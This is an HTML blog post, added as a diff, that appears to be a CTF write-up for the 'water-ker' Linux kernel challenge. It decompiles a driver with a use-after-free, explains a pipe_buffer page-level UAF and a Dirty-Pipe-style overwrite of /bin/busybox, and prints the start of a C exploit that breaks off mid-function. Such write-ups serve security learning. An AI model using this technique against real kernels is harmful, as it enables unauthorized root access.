@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>mimic-water-ker - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+差点抄明白了
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="mimic-water-ker" />
+<meta property="og:description" content="
+差点抄明白了
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/mimic-water-ker/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-11T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-11-11T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="mimic-water-ker"/>
+<meta name="twitter:description" content="
+差点抄明白了
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">mimic-water-ker</h1>
+			<div class="meta">Posted on Nov 11, 2023</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>差点抄明白了</p>
+</blockquote>
+<h2 id="water-ker">water-ker</h2>
+<p>内核题目，权限正确，保护全开，唯一不好的就是没有提供 <code>.config</code> 文件</p>
+<p>运行时保护全开，查看 LKM</p>
+<ul>
+<li>创建一个chunk。</li>
+<li>可以free，并且存在UAF。</li>
+<li>可以 edit 1字节。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">water_ioctl</span>(file <span style="color:#ff79c6">*</span>file, <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> cmd, <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> arg)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">__int64</span> v3; <span style="color:#6272a4">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> arg_; <span style="color:#6272a4">// rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  edit_args args; <span style="color:#6272a4">// [rsp+0h] [rbp-18h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v7; <span style="color:#6272a4">// [rsp+8h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+10h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  _fentry__();
+</span></span><span style="display:flex;"><span>  v8 <span style="color:#ff79c6">=</span> v3;
+</span></span><span style="display:flex;"><span>  v7 <span style="color:#ff79c6">=</span> __readgsqword(<span style="color:#bd93f9">0x28u</span>);
+</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">switch</span> ( cmd )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x30u</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>copy_from_user(<span style="color:#ff79c6">&amp;</span>args, arg_, <span style="color:#bd93f9">8LL</span>) )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( delete_idx <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> chunk )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          kfree();                              <span style="color:#6272a4">// uaf dangling pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>                                                <span style="color:#6272a4">// chunk = 0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">++</span>delete_idx;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0xFFFFFFFFFFFFFFEALL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x50u</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>copy_from_user(<span style="color:#ff79c6">&amp;</span>args, arg_, <span style="color:#bd93f9">8LL</span>) )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( edit_idx <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> chunk <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>copy_from_user(chunk, args.buf, <span style="color:#bd93f9">1LL</span>) )<span style="color:#6272a4">// pipe pages
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">++</span>edit_idx;
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0xFFFFFFFFFFFFFFEALL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x20u</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>copy_from_user(<span style="color:#ff79c6">&amp;</span>args, arg_, <span style="color:#bd93f9">8LL</span>) )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>chunk )
+</span></span><span style="display:flex;"><span>        {                                       <span style="color:#6272a4">// void *kmalloc_trace(struct kmem_cache *s, gfp_t flags, size_t size)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          chunk <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int8</span> <span style="color:#ff79c6">*</span>)kmalloc_trace(kmalloc_caches[<span style="color:#bd93f9">51</span>], <span style="color:#bd93f9">4197568LL</span>, <span style="color:#bd93f9">0x200LL</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> ( chunk )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            copy_from_user(chunk, args.buf, <span style="color:#bd93f9">0x200LL</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0xFFFFFFFFFFFFFFEALL</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>chunk的flag，不是 <code>SLAB_ACCOUNT 0x04000000</code>，因此是 通用slab。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>chunk <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int8</span> <span style="color:#ff79c6">*</span>)kmalloc_trace(kmalloc_caches[<span style="color:#bd93f9">51</span>], <span style="color:#bd93f9">0x400CC0LL</span>, <span style="color:#bd93f9">0x200LL</span>);
+</span></span></code></pre></div><p>思路是使用 pipe 结构体的 page 指针，造成任意读写。</p>
+<ul>
+<li>fcntl 修改 pipe 的size从而可以获得0x200大小的 <code>pipe_bufs ring</code></li>
+<li>uaf 修改 <code>pipe_buffer-&gt;pages</code> 使两个page指针指向同一个内存</li>
+<li>free 一个 page 可以使用另一个page任意读写</li>
+<li>堆喷射提高成功率</li>
+<li>page 使用kmalloc-64。0x40</li>
+</ul>
+<p>gdb调试，使用脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># gdbscript
+</span></span><span style="display:flex;"><span>file vmlinux  # 需要先去除 kaslr 否则地址偏移不对，无法debug
+</span></span><span style="display:flex;"><span>target remote :1234
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># cmd
+</span></span><span style="display:flex;"><span>gdb -x gdbscript
+</span></span></code></pre></div><h3 id="page-level-uaf">page-level-uaf</h3>
+<p>pipe 结构体<code>struct pipe_inode_info (size ?= 0x88)</code> 成员 <code>pipe-&gt;bufs</code>  的成员默认为 10(pipe_bufs &amp;&amp; ring_size)个 <code>struct pipe_buffer</code> ，此结构体第一个成员变量为 <code>struct page *page</code></p>
+<ul>
+<li>堆喷射大量的pipe，然后使用 <code>pipe_fcntl</code> 修改  <code>ring_size</code>  的大小，让 <code>pipe-&gt;bufs</code> 处于 kmalloc-512。</li>
+<li>将部分的 <code>pipe_bufs</code> 修改大，这样会获得比较多的 free 掉的 kmalloc-512</li>
+<li>添加chunk然后free掉，处于kmalloc-512。</li>
+<li>使用<code>fcntl</code> 将改大的 <code>pipe_bufs</code> 改回 kmalloc-512。</li>
+<li>往pipe中写内容，<code>alloc_pages</code> 获得页。</li>
+<li>因为存在uaf，edit 修改page指针的最后一个字节，使两个 pipe （victim, origin） 指向相同的 struct page</li>
+<li><code>struct page</code> 的大小约为 0x40，直接修改 <code>\x00</code> 成功率 <code>75%</code>。0x100 / 0x40 = 4，可能根本就没修改，存在失败的可能性。</li>
+</ul>
+<p>如果我们 close origin pipe ，可以获得 uaf 的 page</p>
+<h3 id="二级-page-level-uaf-构造自写管道">二级 page-level-uaf 构造自写管道</h3>
+<p>上一步close后，存在一个存在 uaf 的 page，我们几乎可以任意读写。这里我们可以继续使用 <code>pipe_buffer</code> 结构体，在close pipe。</p>
+<ul>
+<li>堆喷大量的 pipe</li>
+<li>close origin pipe，获得 free page 1</li>
+<li>fcntl 修改大小，总有在free page 1 的 pipe，我们可以使用 victim 读取内容，获得page 1上的pipe内容</li>
+<li>然后对 free page 1上的 pipe_buffer 进行 类似 uaf 写一字节的效果，使 page 1 的两个 pipe_buffer 的 page 指向同一个地方</li>
+<li>free page 1 的其中一个 pipe，获得一个 uaf 的 free page 2</li>
+<li>使用 pipe_buffer 进行获取，进行读写，但是这里修改free page 2 pipe_buffer page指针为  free page 1 的pipe_buffer 的 page。</li>
+</ul>
+<p>来自a3✌博客的原图。</p>
+<p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="二级自写管道"></p>
+<h3 id="提权">提权</h3>
+<p>读写管道内容：需要先往管道中写内容，才能读取管道内容。这是 <code>struct pipe_buffer</code> 本身的属性  <code>offset &amp; len</code> 决定的。</p>
+<ul>
+<li>offset 开始读取，最多读len长度</li>
+<li>从 offset + len 地方开始写内容</li>
+</ul>
+<p>为什么选择 96 和 192 的 size</p>
+<ul>
+<li>kmalloc存在这两个大小的 kmem_cache。</li>
+<li>这两个size在 kmalloc 中也是比较独特的存在，不是2的幂次方，但是内核中很多的结构体大小类似，因此专门存在这两个size</li>
+</ul>
+<p>kfree 没有size参数？先找page 结构体，不是 slab page 就释放 page，是slab page 释放 object 大小的内容</p>
+<h4 id="pipe-primitive">pipe primitive</h4>
+<p>dirty pipe ，大致就是 <code>struct pipe_buffer</code> 的 flag 存在一个属性： <code>PIPE_BUF_FLAG_CAN_MERGE</code> ，结合 <code>splice</code> 0拷贝，可以写入<strong>任意可读文件</strong>。</p>
+<p>我们主要思路就是：改pipe的flag，实现不依赖地址的内核提权。</p>
+<p>在内核提权过程中，覆盖 <code>/bin/busybox</code> 文件，可以写二级制shellcode 或者 bash 脚本，随便执行命令就行，因为都是 busybox 的 link。</p>
+<ul>
+<li>问题：如果shell写成 <code>/bin/cat /flag</code> ，因为我们改了busybox实现，会出现 <code>Too many levels of symbolic links</code> 的错误提示</li>
+<li>别忘记关闭文件描述符🤣。</li>
+<li>还有的问题就写在注释里了</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * musl-gcc water.c -static -masm=intel -o exp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * strip exp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sched.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ioctl.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/prctl.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define PIPE_SPRAY_NUMS 120
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define SND_PIPE_SPRAY_NUMS 80
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#6272a4">// kmalloc-cg-96
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define SND_PIPE_BUFS_SIZE 96
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define log_info(fmt, ...) \
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  dprintf(2, &#34;\033[32m[+] &#34; fmt &#34;\033[0m\n&#34;, ##__VA_ARGS__)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buf_operations</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>page;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> offset, len;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buf_operations</span> <span style="color:#ff79c6">*</span>ops;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> flags;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">private</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buf_operations</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> (<span style="color:#ff79c6">*</span>confirm)(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>release)(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> (<span style="color:#ff79c6">*</span>try_steal)(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> (<span style="color:#ff79c6">*</span>get)(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>size_t kernel_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81000000</span>;
+</span></span><span style="display:flex;"><span>size_t kernel_offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span style="color:#bd93f9">2</span>];
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> dev_fd;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> victim_idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, origin_idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> target_file[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/bin/busybox&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> payload[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;#!/tmp/sh</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c"> /tmp/cat /flag</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> info_pipe_buf <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">water_args</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">new_chunk</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">512</span>];
+</span></span><span style="display:flex;"><span>  memset(buffer, <span style="color:#bd93f9">0x44</span>, <span style="color:#ff79c6">sizeof</span>(buffer));
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">water_args</span> arg <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>      .buf <span style="color:#ff79c6">=</span> buffer,
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> ioctl(dev_fd, <span style="color:#bd93f9">0x20</span>, <span style="color:#ff79c6">&amp;</span>arg);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">delete_chunk</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">water_args</span> arg <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>      .buf <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>,
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> ioctl(dev_fd, <span style="color:#bd93f9">0x30</span>, <span style="color:#ff79c6">&amp;</span>arg);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">edit_chunk</span>(<span style="color:#8be9fd">char</span> c) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">water_args</span> arg <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>      .buf <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>c,
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> ioctl(dev_fd, <span style="color:#bd93f9">0x50</span>, <span style="color:#ff79c6">&amp;</span>arg);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">err_exit</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>msg) {
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;[-] error: %s&#34;</span>, msg);
+</span></span><span style="display:flex;"><span>  sleep(<span style="color:#bd93f9">5</span>);
+</span></span><span style="display:flex;"><span>  exit(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">debug</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>msg) {
+</span></span><span style="display:flex;"><span>  puts(msg);
+</span></span><span style="display:flex;"><span>  getchar();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">page_level_uaf</span>() {
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;spray pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; <span style="color:#ff79c6">++</span>i) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (pipe(spray_pipe_fd[i]) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>      err_exit(<span style="color:#f1fa8c">&#34;pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;change ring_size make pipe-&gt;bufs kmalloc-512 &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i <span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    fcntl(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], F_SETPIPE_SZ, <span style="color:#bd93f9">0x1000</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;kmalloc-512 hole&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">2</span>) {
+</span></span><span style="display:flex;"><span>    fcntl(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], F_SETPIPE_SZ, <span style="color:#bd93f9">0x1000</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">16</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;new chunk then free&#34;</span>);
